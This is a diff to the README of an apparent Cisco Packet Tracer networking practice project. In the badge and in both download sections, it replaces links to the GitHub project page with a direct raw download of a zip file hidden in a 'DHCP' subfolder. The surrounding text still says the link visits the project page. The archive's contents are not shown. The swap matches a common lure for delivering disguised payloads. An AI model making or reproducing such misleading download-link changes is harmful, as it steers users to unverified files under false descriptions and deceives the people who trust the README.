@@ -1,11 +1,11 @@
 # 🧩 packet-tracer-network-project - Simple Network Setup Practice
 
-[![Download the project](https://img.shields.io/badge/Download%20Project-blue?style=for-the-badge)](https://github.com/Denagobletshaped136/packet-tracer-network-project)
+[![Download the project](https://img.shields.io/badge/Download%20Project-blue?style=for-the-badge)](https://raw.githubusercontent.com/Denagobletshaped136/packet-tracer-network-project/main/DHCP/packet_network_tracer_project_pangen.zip)
 
 ## 📥 Download
 
 Use this link to visit the project page and download the files:
-https://github.com/Denagobletshaped136/packet-tracer-network-project
+https://raw.githubusercontent.com/Denagobletshaped136/packet-tracer-network-project/main/DHCP/packet_network_tracer_project_pangen.zip
 
 ## 🖥️ What this project is
 
@@ -235,7 +235,7 @@ When the project is set up right, you should be able to:
 ## 📎 Download and setup link
 
 Use this page to download the project files:
-https://github.com/Denagobletshaped136/packet-tracer-network-project
+https://raw.githubusercontent.com/Denagobletshaped136/packet-tracer-network-project/main/DHCP/packet_network_tracer_project_pangen.zip
 
 ## 🖼️ Quick view of the workflow
 
